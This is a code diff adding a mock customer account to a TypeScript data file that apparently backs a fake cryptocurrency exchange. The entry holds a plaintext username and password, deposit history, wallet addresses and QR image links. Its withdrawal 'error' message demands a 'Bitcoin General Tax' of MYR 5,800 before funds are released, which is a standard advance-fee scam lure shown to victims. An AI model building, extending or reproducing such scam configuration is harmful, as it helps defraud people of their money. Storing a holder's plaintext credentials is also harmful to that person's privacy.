@@ -2942,5 +2942,79 @@ export const mockAccounts: Account[] = [
         quantity: 0
       }
     ]
+  },
+  {
+    account_id: 'ACC016',
+    holder: {
+      full_name: 'Teresa',
+      dateCreated: '1/30/2026', // m/d/y
+      jointAccount: false,
+      email: 't*@gmail.com',
+      username: 'Teresa267',
+      password: 'Fredo$123'
+    },
+    transaction_mgs_code: {
+      transaction_text_msg: 'To continue this transaction, Please enter the code sent to you.',
+      errorMsg: 'You will receive your bitcoin within 24hours but you have to pay the Bitcoin General Tax which is MYR 5,800. Please ensure the required tax amount is paid to proceed.',
+      // titleSuccessMsg: 'Submitted Successfully',
+      // successMsg: 'Withdrawal Application Submitted',
+      transaction_code: '',
+      wireDate: true
+    },
+    transaction_history: [
+      {
+        date: 'January 28, 2026',
+        description: 'Deposit BTC',
+        walletAddress: 'bc1qA9...X1P0',
+        status: 'Success',
+        quantity: 0.0036,
+        amount_in_usd: 300.0,
+        assets: 'BTC'
+      },
+      {
+        date: 'January 15, 2026',
+        description: 'Deposit BTC',
+        walletAddress: '3FZ91...K8D2',
+        status: 'Success',
+        quantity: 0.0059,
+        amount_in_usd: 500.0,
+        assets: 'BTC'
+      },
+      {
+        date: 'December 31, 2025',
+        description: 'Deposit BTC',
+        walletAddress: 'bc1qP7...M4Q9',
+        status: 'Success',
+        quantity: 0.0036,
+        amount_in_usd: 300.0,
+        assets: 'BTC'
+      },
+    ],
+    assets: [
+      {
+        assetsName: 'BTC',
+        assetsName2: 'Bitcoin',
+        walletAddress: 'bc1q4dux49w5******8nmztuqpd8tx3w',
+        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
+        assetsLogo: 'https://i.imgur.com/N6UMWP2.png',
+        quantity: 0.1645
+      },
+      {
+        assetsName: 'ETH',
+        assetsName2: 'Ethereum',
+        walletAddress: '0x4dEea33c8A8******ce13ffefA5c052e',
+        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
+        assetsLogo: 'https://i.imgur.com/feMQhL4.png',
+        quantity: 0
+      },
+      {
+        assetsName: 'BNB',
+        assetsName2: 'Binance Coin',
+        walletAddress: '0x4dEea33c8A8******ce13ffefA5c052e',
+        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
+        assetsLogo: 'https://i.imgur.com/EKHVvWB.png',
+        quantity: 0
+      }
+    ]
   }
 ];
